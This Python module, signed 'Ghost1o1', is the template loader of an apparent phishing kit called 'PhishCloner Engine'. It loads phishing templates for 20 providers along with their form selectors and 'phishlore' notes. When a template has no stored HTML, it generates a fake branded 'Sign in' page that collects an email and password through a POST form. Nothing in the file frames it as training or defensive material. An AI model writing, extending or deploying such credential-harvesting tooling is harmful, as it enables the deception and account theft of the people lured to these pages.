"""
PhishCloner Engine — Module 9: Template Loader
Signé Ghost1o1 — v1.0.0

Charge et sert les templates de phishing (20 providers).
"""

import json
import logging
from pathlib import Path
from typing import Dict, List, Optional

log = logging.getLogger("PhishCloner.Templates")

TEMPLATES_DIR = Path(__file__).parent.parent / "templates"
MANIFEST_PATH = TEMPLATES_DIR / "manifest.json"


class TemplateLoader:
    """Charge les templates de phishing avec leurs sélecteurs."""

    def __init__(self):
        self.manifest: Dict = {}
        self._load_manifest()

    def _load_manifest(self):
        if MANIFEST_PATH.exists():
            try:
                self.manifest = json.loads(MANIFEST_PATH.read_text())
                log.info(f"Loaded {len(self.manifest.get('templates', {}))} templates")
            except json.JSONDecodeError as e:
                log.error(f"Failed to parse manifest: {e}")
        else:
            log.warning(f"Manifest not found at {MANIFEST_PATH}")

    def list_templates(self) -> List[Dict]:
        return [
            {"id": tid, "name": t["name"], "category": t["category"],
             "difficulty": t["difficulty"], "url": t["url"]}
            for tid, t in self.manifest.get("templates", {}).items()
        ]

    def get_template(self, template_id: str) -> Optional[Dict]:
        return self.manifest.get("templates", {}).get(template_id)

    def get_html(self, template_id: str) -> Optional[str]:
        html_path = TEMPLATES_DIR / template_id / "index.html"
        if html_path.exists():
            return html_path.read_text(encoding="utf-8")
        template = self.get_template(template_id)
        if template:
            return self._generate_minimal_html(template_id, template)
        return None

    def get_phishlore(self, template_id: str) -> Optional[str]:
        lore_path = TEMPLATES_DIR / template_id / "phishlore.md"
        if lore_path.exists():
            return lore_path.read_text(encoding="utf-8")
        return None

    def get_selectors(self, template_id: str) -> Dict:
        template = self.get_template(template_id)
        return template.get("selectors", {}) if template else {}

    def _generate_minimal_html(self, template_id: str, template: Dict) -> str:
        name = template.get("name", template_id)
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{name} — Sign In</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f0f2f5; display: flex; justify-content: center; align-items: center;
                min-height: 100vh; }}
        .container {{ background: white; padding: 40px; border-radius: 8px;
                     box-shadow: 0 2px 16px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }}
        .logo {{ text-align: center; margin-bottom: 24px; font-size: 28px; font-weight: 700; color: #1a73e8; }}
        h1 {{ font-size: 24px; margin-bottom: 8px; text-align: center; }}
        p {{ color: #5f6368; margin-bottom: 24px; text-align: center; font-size: 14px; }}
        input {{ width: 100%; padding: 12px 14px; margin-bottom: 16px; border: 1px solid #dadce0;
                border-radius: 4px; font-size: 16px; }}
        input:focus {{ outline: none; border-color: #1a73e8; }}
        button {{ width: 100%; padding: 12px; background: #1a73e8; color: white; border: none;
                 border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }}
        button:hover {{ background: #1557b0; }}
        .footer {{ margin-top: 24px; text-align: center; font-size: 12px; color: #5f6368; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{name}</div>
        <h1>Sign in</h1>
        <p>to continue to {name}</p>
        <form id="login-form" method="POST">
            <input type="email" name="username" placeholder="Email or username" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">
            <a href="#">Forgot password?</a>
        </div>
    </div>
</body>
</html>"""
